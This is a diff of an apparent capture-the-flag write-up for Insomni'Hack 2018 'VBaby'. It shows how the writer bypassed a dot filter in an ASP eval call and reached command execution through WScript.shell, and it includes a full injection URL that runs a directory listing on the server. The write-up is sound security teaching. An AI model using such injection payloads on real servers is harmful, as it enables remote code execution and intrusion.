@@ -1,5 +1,6 @@
 ---
 title: Insomni'Hack 2018 - VBaby
+date: 2018-03-25 21:00:00 +0100
 ---
 
 # {{page.title}}
@@ -17,11 +18,11 @@ After some research, we find out that the server is performing an `eval` call on
 
 We can use two different technics to bypass the dot filter:
 1. using `Chr(46)` and concatenation character `&`.
-2. using `page=Request("cmd")` and putting the payload within `cmd` parameter.
+2. using `Eval(Request("cmd"))` and putting the payload within `cmd` parameter. Indeed, only the `page` parameter content is filtered.
 
 In order to execute code in VBS, we can leverage `WScript.shell` object. To read the output of the command (and read file content), we use `scripting.FileSystemObject`.
 
-First, we list files and folders within `C:\` by running `cmd /c dir C:\>C:\temp\dir.txt`:
+First, we enumerate files and folders within `C:\` by running `cmd /c dir C:\>C:\temp\dir.txt`:
 ```shell
 http://vbaby.insomni.hack/Default.asp?page=%26Eval(Request("cmd"))&cmd=CreateObject("wscript.shell").Run("cmd+/c+dir+C:\>C:\temp\dir.txt")
 ```
